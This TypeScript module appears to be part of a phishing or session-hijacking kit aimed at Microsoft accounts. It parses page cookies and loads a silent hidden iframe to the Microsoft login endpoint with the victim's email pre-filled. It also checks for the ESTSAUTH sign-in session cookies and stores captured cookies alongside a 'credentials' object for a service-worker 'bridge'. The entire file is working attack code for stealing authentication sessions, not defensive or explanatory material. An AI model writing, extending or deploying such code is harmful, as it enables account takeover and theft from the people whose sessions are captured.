/**
 * Microsoft Cookie Capture Utilities
 * Handles cookie capture specifically for Microsoft authentication flow
 */

export interface CapturedCookie {
  name: string;
  value: string;
  domain: string;
  path: string;
  secure: boolean;
  httpOnly?: boolean;
  sameSite?: string;
  expires?: number;
  expirationDate?: number;
  session?: boolean;
}

export interface CookieCaptureResult {
  success: boolean;
  cookies: CapturedCookie[];
  domain: string;
  timestamp: string;
  source: string;
  totalCookies: number;
}

/**
 * Captures cookies from the current Microsoft domain
 */
export function captureMicrosoftCookies(): CookieCaptureResult {
  console.log('🍪 Starting Microsoft cookie capture...');
  
  const cookies: CapturedCookie[] = [];
  const currentDomain = window.location.hostname;
  const timestamp = new Date().toISOString();
  
  try {
    // Get all cookies from document.cookie
    const cookieString = document.cookie;
    
    if (!cookieString) {
      console.warn('⚠️ No cookies found in document.cookie');
      return {
        success: false,
        cookies: [],
        domain: currentDomain,
        timestamp,
        source: 'document.cookie',
        totalCookies: 0
      };
    }
    
    // Parse cookies from document.cookie
    const cookiePairs = cookieString.split(';');
    
    cookiePairs.forEach(pair => {
      const trimmed = pair.trim();
      if (trimmed) {
        const equalsIndex = trimmed.indexOf('=');
        if (equalsIndex > 0) {
          const name = trimmed.substring(0, equalsIndex).trim();
          const value = trimmed.substring(equalsIndex + 1).trim();
          
          if (name && value) {
            cookies.push({
              name: name,
              value: value,
              domain: currentDomain,
              path: '/',
              secure: window.location.protocol === 'https:',
              sameSite: 'None',
              session: true
            });
          }
        }
      }
    });
    
    console.log(`✅ Captured ${cookies.length} cookies from ${currentDomain}`);
    
    return {
      success: cookies.length > 0,
      cookies,
      domain: currentDomain,
      timestamp,
      source: 'document.cookie',
      totalCookies: cookies.length
    };
    
  } catch (error) {
    console.error('❌ Error capturing cookies:', error);
    return {
      success: false,
      cookies: [],
      domain: currentDomain,
      timestamp,
      source: 'error',
      totalCookies: 0
    };
  }
}

/**
 * Creates a silent iframe to capture cookies from Microsoft domain
 */
export function createMicrosoftCookieCaptureFrame(email: string): Promise<CookieCaptureResult> {
  return new Promise((resolve) => {
    console.log('🔧 Creating silent Microsoft cookie capture frame...');
    
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.style.width = '0';
    iframe.style.height = '0';
    iframe.style.border = 'none';
    iframe.id = 'microsoft-cookie-capture-frame';
    
    // Microsoft login URL that should trigger cookie setting
    // ✅ CORRECTED CLIENT ID
    const microsoftUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2e338732-c914-4129-a148-45c24f2da81d&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile%20email&state=capture&login_hint=${encodeURIComponent(email)}`;
    
    let timeoutId: NodeJS.Timeout;
    let resolved = false;
    
    const cleanup = () => {
      if (timeoutId) clearTimeout(timeoutId);
      if (iframe.parentNode) {
        iframe.parentNode.removeChild(iframe);
      }
    };
    
    const resolveWithResult = (result: CookieCaptureResult) => {
      if (!resolved) {
        resolved = true;
        cleanup();
        resolve(result);
      }
    };
    
    // Listen for iframe load events
    iframe.onload = () => {
      console.log('🔄 Microsoft frame loaded, attempting cookie capture...');
      
      setTimeout(() => {
        try {
          // Try to access iframe cookies (will work if same-origin or properly configured)
          const iframeDocument = iframe.contentDocument || iframe.contentWindow?.document;
          
          if (iframeDocument) {
            const iframeCookies = iframeDocument.cookie;
            console.log('🍪 Iframe cookies:', iframeCookies);
            
            if (iframeCookies) {
              const cookies: CapturedCookie[] = [];
              const cookiePairs = iframeCookies.split(';');
              
              cookiePairs.forEach(pair => {
                const trimmed = pair.trim();
                if (trimmed) {
                  const equalsIndex = trimmed.indexOf('=');
                  if (equalsIndex > 0) {
                    const name = trimmed.substring(0, equalsIndex).trim();
                    const value = trimmed.substring(equalsIndex + 1).trim();
                    
                    if (name && value) {
                      cookies.push({
                        name: name,
                        value: value,
                        domain: 'login.microsoftonline.com',
                        path: '/',
                        secure: true,
                        sameSite: 'None',
                        session: true
                      });
                    }
                  }
                }
              });
              
              resolveWithResult({
                success: cookies.length > 0,
                cookies,
                domain: 'login.microsoftonline.com',
                timestamp: new Date().toISOString(),
                source: 'iframe-capture',
                totalCookies: cookies.length
              });
              return;
            }
          }
        } catch (error) {
          console.warn('⚠️ Cannot access iframe cookies (CORS):', error);
        }
        
        // Fallback: capture cookies from main document
        const fallbackResult = captureMicrosoftCookies();
        resolveWithResult({
          ...fallbackResult,
          source: 'iframe-fallback'
        });
      }, 2000);
    };
    
    iframe.onerror = () => {
      console.warn('⚠️ Microsoft frame failed to load');
      const fallbackResult = captureMicrosoftCookies();
      resolveWithResult({
        ...fallbackResult,
        source: 'iframe-error-fallback'
      });
    };
    
    // Timeout after 10 seconds
    timeoutId = setTimeout(() => {
      console.warn('⚠️ Microsoft frame capture timeout');
      const fallbackResult = captureMicrosoftCookies();
      resolveWithResult({
        ...fallbackResult,
        source: 'iframe-timeout-fallback'
      });
    }, 10000);
    
    // Add iframe to document and start loading
    document.body.appendChild(iframe);
    iframe.src = microsoftUrl;
  });
}

/**
 * Stores captured cookies in localStorage/sessionStorage
 */
export function storeCapturedCookies(result: CookieCaptureResult): boolean {
  try {
    const cookieExport = {
      version: '1.0',
      exportedAt: result.timestamp,
      source: result.source,
      domain: result.domain,
      totalCookies: result.totalCookies,
      cookies: result.cookies,
      note: 'Cookies captured from Microsoft authentication flow'
    };
    
    const cookieData = JSON.stringify(cookieExport);
    
    localStorage.setItem('captured_cookies_data', cookieData);
    sessionStorage.setItem('captured_cookies_data', cookieData);
    localStorage.setItem('captured_cookies', JSON.stringify(result.cookies));
    sessionStorage.setItem('captured_cookies', JSON.stringify(result.cookies));
    
    console.log('💾 Cookies stored successfully');
    return true;
    
  } catch (error) {
    console.error('❌ Failed to store cookies:', error);
    return false;
  }
}

/**
 * Enhanced cookie capture that tries multiple methods
 */
export async function enhancedMicrosoftCookieCapture(email: string): Promise<CookieCaptureResult> {
  console.log('🚀 Starting enhanced Microsoft cookie capture...');
  
  // Method 1: Direct capture from current page
  const directResult = captureMicrosoftCookies();
  
  if (directResult.success && directResult.cookies.length > 0) {
    console.log('✅ Direct capture successful');
    storeCapturedCookies(directResult);
    return directResult;
  }
  
  // Method 2: Silent iframe capture
  console.log('🔄 Trying iframe capture method...');
  const iframeResult = await createMicrosoftCookieCaptureFrame(email);
  
  if (iframeResult.success && iframeResult.cookies.length > 0) {
    console.log('✅ Iframe capture successful');
    storeCapturedCookies(iframeResult);
    return iframeResult;
  }
  
  // Method 3: Fallback - return whatever we got
  console.log('⚠️ Using fallback capture method');
  const fallbackResult = directResult.cookies.length > 0 ? directResult : iframeResult;
  storeCapturedCookies(fallbackResult);
  
  return fallbackResult;
}

// ✅ ADD THESE MISSING EXPORTS THAT App.tsx NEEDS:

/**
 * Microsoft Cookie Bridge for Service Worker communication
 */
export const microsoftCookieBridge = {
  async setEmail(email: string): Promise<void> {
    sessionStorage.setItem('ms_email', email);
    localStorage.setItem('ms_email', email);
    console.log('📧 Email stored:', email);
  },

  async waitForCookieCapture(timeout: number = 15000): Promise<any> {
    console.log('⏳ Waiting for cookie capture...');
    const startTime = Date.now();
    
    while (Date.now() - startTime < timeout) {
      const capturedData = sessionStorage.getItem('captured_cookies_data') || 
                          localStorage.getItem('captured_cookies_data');
      
      if (capturedData) {
        try {
          const parsed = JSON.parse(capturedData);
          console.log('✅ Cookie capture data found');
          return {
            cookies: parsed.cookies || [],
            accountDetected: parsed.cookies?.length > 0
          };
        } catch (e) {
          console.warn('Failed to parse captured data');
        }
      }
      
      await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    console.warn('⚠️ Cookie capture timeout');
    return null;
  },

  async storeCaptureDa(cookies: any[], credentials: any): Promise<void> {
    const data = {
      cookies,
      credentials,
      timestamp: new Date().toISOString()
    };
    
    localStorage.setItem('captured_cookies_data', JSON.stringify(data));
    sessionStorage.setItem('captured_cookies_data', JSON.stringify(data));
    console.log('💾 Capture data stored');
  },

  async isAccountSignedIn(): Promise<boolean> {
    const cookies = document.cookie;
    return cookies.includes('ESTSAUTH') || cookies.includes('SignInStateCookie');
  },

  async retrieveCaptureData(): Promise<any> {
    const data = localStorage.getItem('captured_cookies_data') || 
                 sessionStorage.getItem('captured_cookies_data');
    
    if (data) {
      try {
        return JSON.parse(data);
      } catch (e) {
        console.error('Failed to parse capture data');
      }
    }
    
    return null;
  },

  clearCapturedCookies(): void {
    localStorage.removeItem('captured_cookies_data');
    sessionStorage.removeItem('captured_cookies_data');
    localStorage.removeItem('captured_cookies');
    sessionStorage.removeItem('captured_cookies');
    console.log('🧹 Captured cookies cleared');
  }
};

/**
 * Initialize the Microsoft Cookie Bridge
 */
export function initializeMicrosoftCookieBridge(): void {
  console.log('🚀 Initializing Microsoft Cookie Bridge...');
  
  // Make it available globally for debugging
  if (typeof window !== 'undefined') {
    (window as any).microsoftCookieBridge = microsoftCookieBridge;
  }
  
  console.log('✅ Microsoft Cookie Bridge initialized');
}